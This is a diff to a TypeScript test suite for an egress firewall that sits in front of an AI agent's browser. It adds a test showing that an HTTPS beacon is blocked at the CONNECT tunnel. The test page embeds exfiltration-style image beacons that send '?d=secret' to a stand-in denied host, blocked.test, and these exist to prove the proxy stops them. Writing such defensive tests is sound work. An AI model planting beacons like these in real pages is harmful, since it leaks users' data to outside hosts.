@@ -37,8 +37,9 @@ describeLive("egress firewall — live, real agent-browser through the proxy", (
   let engine: AgentBrowserEngine;
 
   beforeAll(async () => {
-    // The allowed page embeds a beacon on the DENIED origin.
-    allowSrv = await startServer(() => `<!doctype html><html><body>OK<img src="http://blocked.test/beacon?d=secret"></body></html>`);
+    // The allowed page embeds beacons on the DENIED origin over BOTH HTTP and
+    // HTTPS — the HTTPS one proves CONNECT-tunnel egress is gated too.
+    allowSrv = await startServer(() => `<!doctype html><html><body>OK<img src="http://blocked.test/beacon?d=secret"><img src="https://blocked.test/beacon-https?d=secret"></body></html>`);
     blockSrv = await startServer(() => `should-never-be-served`);
     proxy = new EgressProxy({
       allow: originAllowlist(["http://allow.test"], []), // ONLY the task origin
@@ -72,6 +73,27 @@ describeLive("egress firewall — live, real agent-browser through the proxy", (
       expect(allowed.length, "allowed origin was forwarded through the proxy").toBeGreaterThan(0);
       expect(blocked.length, "denied beacon was blocked at the proxy").toBeGreaterThan(0);
       // The attacker server received NOTHING — the block was before the network.
+      expect(blockSrv.hits()).toBe(0);
+    } finally {
+      await session.close().catch(() => undefined);
+    }
+  }, 60_000);
+
+  it("BLOCKS an HTTPS sub-resource beacon at the CONNECT tunnel (D3: HTTPS egress is gated)", async () => {
+    const session = await engine.createSession();
+    try {
+      await session.navigate("http://allow.test/");
+      const deadline = Date.now() + 8000;
+      while (Date.now() < deadline && !proxy.decisions.some((d) => d.origin === "https://blocked.test")) {
+        await new Promise((r) => setTimeout(r, 200));
+      }
+      // The HTTPS beacon arrives at the proxy as a CONNECT to blocked.test:443 and
+      // is refused before any tunnel — proving HTTPS egress is gated by destination
+      // origin, not just HTTP. (This is the gap D3 closed via the `--proxy` flag.)
+      const blockedHttps = proxy.decisions.filter(
+        (d) => d.origin === "https://blocked.test" && d.method === "connect" && !d.allowed,
+      );
+      expect(blockedHttps.length, "denied HTTPS beacon was blocked at the CONNECT tunnel").toBeGreaterThan(0);
       expect(blockSrv.hits()).toBe(0);
     } finally {
       await session.close().catch(() => undefined);
